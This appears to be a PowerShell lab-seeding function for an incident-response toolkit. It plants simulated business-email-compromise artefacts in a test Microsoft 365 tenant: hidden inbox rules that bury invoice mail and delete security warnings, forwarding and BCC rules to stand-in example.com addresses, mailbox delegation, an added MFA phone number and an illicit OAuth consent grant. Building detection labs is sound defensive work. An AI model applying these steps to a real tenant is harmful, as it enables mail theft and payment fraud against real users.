function Invoke-IRLabSeed {
    <#
    .SYNOPSIS
        Plants fake BEC compromise artefacts in a LAB tenant so the toolkit has something to find.
    .DESCRIPTION
        Refuses to run unless Assert-IRLabTenant passes. Each artefact is recorded in the lab state
        file as soon as it's created; Invoke-IRLabCleanup removes them.

        External addresses use example.com (reserved, can't receive mail). Phone numbers use the
        reserved 555-01xx range.

        Artefacts:
          1. Inbox rule '.'   - invoice/payment mail moved to RSS Feeds and marked read
          2. Inbox rule '..'  - security / password warnings deleted
          3. Inbox rule 'Inbox' - remittance mail forwarded to an external address
          4. Mailbox forwarding to an external address, keeping a copy
          5. Inbox folder shared with Default (everyone) as Reviewer
          6. Victim granted FullAccess on the executive's mailbox
          7. Victim granted SendAs on the executive's mailbox
          8. Transport rule BCC'ing the victim's payment mail to an external address
          9. Extra phone authentication method on the victim
         10. App registration "Mail Sync Pro" with a client secret, and a delegated consent grant
             (Mail.ReadWrite, Mail.Send, offline_access) for the victim
    .PARAMETER Victim
        UPN of the lab user playing the compromised account. Must be licensed with a mailbox.
    .PARAMETER Executive
        UPN of a second lab mailbox (licensed or shared) whose access the attacker abuses.
    .EXAMPLE
        Invoke-IRLabSeed -Victim alex@eiflab.onmicrosoft.com -Executive ceo@eiflab.onmicrosoft.com
    #>
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]
    param(
        [Parameter(Mandatory)]
        [string]$Victim,

        [Parameter(Mandatory)]
        [string]$Executive,

        [switch]$Force
    )

    Assert-IRLabTenant

    $existing = @(Get-IRLabState)
    if ($existing.Count -gt 0 -and -not $Force) {
        throw "Lab already has $($existing.Count) seeded artefact(s). Run Invoke-IRLabCleanup first, or use -Force to add more."
    }

    $victimUser = Get-MgUser -UserId $Victim -ErrorAction Stop
    Get-MgUser -UserId $Executive -ErrorAction Stop | Out-Null
    Get-Mailbox -Identity $Victim -ErrorAction Stop | Out-Null
    Get-Mailbox -Identity $Executive -ErrorAction Stop | Out-Null

    if (-not $PSCmdlet.ShouldProcess("lab tenant $($script:IRContext.PrimaryDomain): victim $Victim, executive $Executive", 'Plant 10 fake compromise artefacts')) {
        return
    }

    # Runs one seed step; a failure is logged and counted but doesn't stop the remaining steps.
    $step = {
        param([string]$Name, [scriptblock]$Action)
        try { & $Action }
        catch {
            $script:IRLabSeedFailed++
            Write-IRLog -Level Error -Message "Seed step failed ($Name): $($_.Exception.Message)"
        }
    }
    $script:IRLabSeedFailed = 0

    # 1-3: inbox rules
    & $step 'inbox rule .' {
        $rule = New-InboxRule -Mailbox $Victim -Name '.' -SubjectOrBodyContainsWords 'invoice', 'payment', 'wire', 'bank details' `
            -MoveToFolder "$($Victim):\RSS Feeds" -MarkAsRead $true -StopProcessingRules $true -ErrorAction Stop
        Add-IRLabArtefact -Type 'InboxRule' -Description "Inbox rule '.' on $Victim (invoice/payment -> RSS Feeds)" `
            -Data @{ Mailbox = $Victim; RuleIdentity = "$($rule.RuleIdentity)" }
    }
    & $step 'inbox rule ..' {
        $rule = New-InboxRule -Mailbox $Victim -Name '..' -SubjectOrBodyContainsWords 'security', 'password', 'hacked', 'phishing', 'suspicious' `
            -DeleteMessage $true -StopProcessingRules $true -ErrorAction Stop
        Add-IRLabArtefact -Type 'InboxRule' -Description "Inbox rule '..' on $Victim (security warnings deleted)" `
            -Data @{ Mailbox = $Victim; RuleIdentity = "$($rule.RuleIdentity)" }
    }
    & $step 'inbox rule forward' {
        $rule = New-InboxRule -Mailbox $Victim -Name 'Inbox' -SubjectOrBodyContainsWords 'remittance', 'statement' `
            -ForwardTo 'ap-collect@example.com' -ErrorAction Stop
        Add-IRLabArtefact -Type 'InboxRule' -Description "Inbox rule 'Inbox' on $Victim (remittance -> ap-collect@example.com)" `
            -Data @{ Mailbox = $Victim; RuleIdentity = "$($rule.RuleIdentity)" }
    }

    # 4: mailbox forwarding
    & $step 'mailbox forwarding' {
        $before = Get-Mailbox -Identity $Victim -ErrorAction Stop
        Set-Mailbox -Identity $Victim -ForwardingSmtpAddress 'smtp:mailsync@example.com' -DeliverToMailboxAndForward $true -ErrorAction Stop
        Add-IRLabArtefact -Type 'MailboxForwarding' -Description "Mailbox forwarding on $Victim -> mailsync@example.com" `
            -Data @{
                Mailbox                    = $Victim
                PreviousForwardingSmtp     = "$($before.ForwardingSmtpAddress)"
                PreviousDeliverAndForward  = [bool]$before.DeliverToMailboxAndForward
            }
    }

    # 5: Inbox folder permission for Default
    & $step 'inbox folder permission' {
        $folder = "$($Victim):\Inbox"
        $before = Get-MailboxFolderPermission -Identity $folder -User Default -ErrorAction Stop
        Set-MailboxFolderPermission -Identity $folder -User Default -AccessRights Reviewer -ErrorAction Stop
        Add-IRLabArtefact -Type 'FolderPermission' -Description "Inbox of $Victim shared with Default as Reviewer" `
            -Data @{ Folder = $folder; User = 'Default'; PreviousAccessRights = @($before.AccessRights | ForEach-Object { "$_" }) }
    }

    # 6-7: delegation on the executive mailbox
    & $step 'FullAccess' {
        Add-MailboxPermission -Identity $Executive -User $Victim -AccessRights FullAccess -AutoMapping $false -ErrorAction Stop | Out-Null
        Add-IRLabArtefact -Type 'MailboxPermission' -Description "$Victim granted FullAccess on $Executive" `
            -Data @{ Mailbox = $Executive; User = $Victim }
    }
    & $step 'SendAs' {
        Add-RecipientPermission -Identity $Executive -Trustee $Victim -AccessRights SendAs -Confirm:$false -ErrorAction Stop | Out-Null
        Add-IRLabArtefact -Type 'RecipientPermission' -Description "$Victim granted SendAs on $Executive" `
            -Data @{ Mailbox = $Executive; Trustee = $Victim }
    }

    # 8: transport rule
    & $step 'transport rule' {
        $rule = New-TransportRule -Name 'Compliance Archive' -From $Victim -SubjectOrBodyContainsWords 'invoice', 'payment' `
            -BlindCopyTo 'archive@example.com' -ErrorAction Stop
        Add-IRLabArtefact -Type 'TransportRule' -Description "Transport rule 'Compliance Archive' (BCC $Victim payment mail -> archive@example.com)" `
            -Data @{ Guid = "$($rule.Guid)"; Name = 'Compliance Archive' }
    }

    # 9: extra phone authentication method
    & $step 'phone method' {
        $present = @(Get-MgUserAuthenticationPhoneMethod -UserId $victimUser.Id -ErrorAction Stop | ForEach-Object { "$($_.PhoneType)" })
        $type = @('alternateMobile', 'mobile', 'office') | Where-Object { $present -notcontains $_ } | Select-Object -First 1
        if (-not $type) { throw 'Victim already has every phone method type; skipping.' }
        $method = New-MgUserAuthenticationPhoneMethod -UserId $victimUser.Id -BodyParameter @{ phoneNumber = '+1 2025550143'; phoneType = $type } -ErrorAction Stop
        Add-IRLabArtefact -Type 'PhoneMethod' -Description "Phone method ($type, +1 202 555 0143) added to $Victim" `
            -Data @{ UserId = $victimUser.Id; MethodId = "$($method.Id)" }
    }

    # 10: illicit consent grant to a "mail sync" app with a client secret
    & $step 'consent grant' {
        $app = New-MgApplication -DisplayName 'Mail Sync Pro' -SignInAudience 'AzureADMyOrg' -Tags @($script:IRLabTag) `
            -Notes 'EverythingIsFine lab artefact. Safe to delete.' -ErrorAction Stop
        Add-IRLabArtefact -Type 'Application' -Description "App registration 'Mail Sync Pro' ($($app.AppId))" -Data @{ Id = $app.Id }

        # The secret value is returned once and discarded. Only its existence matters to the toolkit.
        Add-MgApplicationPassword -ApplicationId $app.Id -PasswordCredential @{ displayName = 'sync'; endDateTime = (Get-Date).AddDays(30).ToUniversalTime().ToString('o') } -ErrorAction Stop | Out-Null

        $sp = New-MgServicePrincipal -AppId $app.AppId -Tags @($script:IRLabTag) -ErrorAction Stop
        Add-IRLabArtefact -Type 'ServicePrincipal' -Description "Service principal for 'Mail Sync Pro'" -Data @{ Id = $sp.Id }

        $graph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'" -ErrorAction Stop | Select-Object -First 1
        $grant = New-MgOauth2PermissionGrant -BodyParameter @{
            clientId    = $sp.Id
            consentType = 'Principal'
            principalId = $victimUser.Id
            resourceId  = $graph.Id
            scope       = 'User.Read Mail.ReadWrite Mail.Send offline_access'
        } -ErrorAction Stop
        Add-IRLabArtefact -Type 'PermissionGrant' -Description "Delegated grant: $Victim -> 'Mail Sync Pro' (Mail.ReadWrite Mail.Send offline_access)" `
            -Data @{ Id = $grant.Id }
    }

    $failed = $script:IRLabSeedFailed
    $count = @(Get-IRLabState).Count
    if ($failed -gt 0) {
        Write-IRLog -Level Warn -Message "Seeding finished with $failed failed step(s). $count artefact(s) recorded. Anything a failed step did create is recorded and will be cleaned up."
    }
    else {
        Write-IRLog -Level Info -Message "Seeding finished. $count artefact(s) recorded. Audit events can take 30 minutes to 24 hours to appear."
    }
    Write-IRLog -Level Info -Message 'Next: do the manual attacker steps in LAB.md, then run the toolkit. Clean up with Invoke-IRLabCleanup.'
    @(Get-IRLabState)
}
